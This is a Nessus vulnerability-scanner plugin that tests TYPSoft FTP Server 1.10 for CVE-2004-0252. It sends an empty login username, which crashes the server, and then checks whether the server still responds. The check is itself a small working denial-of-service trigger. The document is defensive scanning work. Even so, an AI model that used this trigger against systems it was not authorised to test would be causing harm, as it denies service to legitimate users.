#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(14707);
 script_version("$Revision: 1.24 $");
 script_cvs_date("$Date: 2016/11/03 14:16:36 $");

 script_cve_id("CVE-2004-0252");
 script_bugtraq_id(9573);
 script_osvdb_id(6613);

 script_name(english:"TYPSoft FTP Server Empty Username DoS");
 script_summary(english:"Checks for TYPSoft FTP server empty username DoS");

 script_set_attribute(attribute:"synopsis", value:
"It is possible to crash the remote FTP server." );
 script_set_attribute(attribute:"description", value:
"The remote host seems to be running TYPSoft FTP server, version 1.10. 

This version is prone to a remote denial of service flaw.  By sending
an empty login username, an attacker can cause the FTP server to
crash, denying service to legitimate users." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2004/Feb/114");
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:ND/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2004/09/13");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/02/04");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2004-2016 Tenable Network Security, Inc.");
 script_family(english:"FTP");
 script_dependencie("find_service_3digits.nasl", "ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 script_require_keys("ftp/typsoftftp");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("ftp_func.inc");


port = get_ftp_port(default: 21);

login = "";
pass  = get_kb_item("ftp/password");

soc = open_sock_tcp(port);
if (! soc ) exit(1, "TCP connection failed to port "+port+".");
if (! ftp_authenticate(socket:soc, user:login, pass:pass))
 exit(0, "Cannot authenticate on FTP server on port "+port+".");

#ftp_close(socket: soc);
for (i = 0; i < 3; i ++)
{
  sleep(1);
  soc2 = open_sock_tcp(port);
  if (soc2) break;
}

if (! soc2 || ! recv_line(socket:soc2, length:4096))
 security_warning(port);

if (soc2) close(soc2);
close(soc);
